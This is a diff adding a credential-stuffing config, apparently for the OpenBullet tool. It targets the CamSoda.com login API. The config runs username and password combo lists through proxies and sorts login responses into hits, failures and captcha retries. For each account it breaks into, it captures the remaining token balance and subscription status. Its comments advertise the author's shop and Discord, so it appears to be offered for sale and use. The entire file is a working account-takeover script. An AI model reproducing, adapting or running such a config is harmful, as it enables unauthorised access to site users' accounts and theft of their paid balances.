@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "CamSoda.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-02T01:22:35.2556056+10:00",
+  "AdditionalInfo": "Capture Tokens & Plan [PARADOX CONFIG]",
+  "Author": "Croppable",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Camsoda_Config REQUEST POST "https://www.camsoda.com/api/v1/auth/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.camsoda.com" 
+  HEADER "referer: https://www.camsoda.com/" 
+
+#For_OB_Discord KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"settings\":{\"" 
+  KEYCHAIN Failure OR 
+    KEY "These credentials do not match our records" 
+  KEYCHAIN Retry OR 
+    KEY "{\"captcha_required\":true" 
+
+#Go_Have_A_Look_At_My_Shop REQUEST GET "https://www.camsoda.com/account/membership" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#paradoxconfig.selly.store PARSE "<SOURCE>" LR "\",\"tokens\":" ",\"media" -> CAP "Tokens Left" 
+
+#paradoxconfig.selly.store PARSE "<SOURCE>" LR "\":[],\"has_purchase\":" ",\"isWhale" -> CAP "Subcription" 
+
